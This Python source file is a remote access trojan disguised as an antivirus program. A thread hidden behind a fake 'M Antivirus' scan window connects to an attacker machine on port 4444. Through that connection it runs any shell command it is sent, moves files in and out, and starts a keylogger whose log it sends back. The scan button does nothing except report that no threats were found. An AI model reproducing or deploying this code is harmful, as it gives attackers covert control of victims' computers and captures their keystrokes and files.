import socket
import subprocess
import os
import base64
import time
import threading
import tkinter as tk
from tkinter import ttk
from keylogger import startKeylogger


# RAT:

def connect():
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect(('192.168.1.4', 4444))  # IP and Port of the attacker machine
			return s
		except Exception:
			time.sleep(10)
			continue


def execute_commands(command):
	try:
		output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
		return output.decode(errors='replace')
	except Exception as e:
		return str(e)


def write_file(path, content):
	with open(path, 'wb') as file:
		file.write(base64.b64decode(content))


def read_file(path):
	with open(path, 'rb') as file:
		content = base64.b64encode(file.read())
		return content.decode()


def rat_client():
	s = connect()
	try:
		while True:
			data = s.recv(1024)
			if not data:
				break
			command = data.decode()
			if command.lower() == 'exit':
				break
			elif command.startswith('cd '):
				try:
					os.chdir(command[3:])
					s.send(str.encode(os.getcwd()))
				except Exception as e:
					s.send(str.encode(str(e)))
			elif command.startswith('download '):
				path = command[9:]
				if os.path.exists(path):
					s.send(str.encode(read_file(path)))
				else:
					s.send(str.encode("File not found"))
			elif command.startswith('upload '):
				path = command[7:]
				content = s.recv(100000).decode()
				write_file(path, content)
				s.send(str.encode("Upload complete"))
			elif command == 'keylogger':
				keylogger_thread = threading.Thread(target=startKeylogger, daemon=True)
				keylogger_thread.start()
			elif command == 'sendLog':
				if os.path.exists("Keylogg.txt"):
					s.send(str.encode(read_file("Keylogg.txt")))
				else:
					s.send(str.encode("No keylog file found"))
			else:
				output = execute_commands(command)
				s.send(str.encode(output))
	finally:
		s.close()


# M antivirus GUI:

def start_scan():
	progress['value'] = 100
	root.update_idletasks()
	result.config(text="Scan Completed No threats found :) ")


def create_gui():
	global root, progress, result
	root = tk.Tk()
	root.title("M Antivirus")

	frame = ttk.Frame(root, padding=20)
	frame.grid(row=0, column=0)

	scanButton = ttk.Button(frame, text="Start Scan", command=start_scan)
	scanButton.grid(row=0, column=0, pady=10)

	progress = ttk.Progressbar(frame, orient=tk.HORIZONTAL, length=200, mode='determinate')
	progress.grid(row=1, column=0, pady=10)

	result = ttk.Label(frame, text="")
	result.grid(row=2, column=0, pady=10)

	root.mainloop()


# Main

def main():
	ratThread = threading.Thread(target=rat_client, daemon=True)
	ratThread.start()

	create_gui()


if __name__ == "__main__":
	main()


		

        



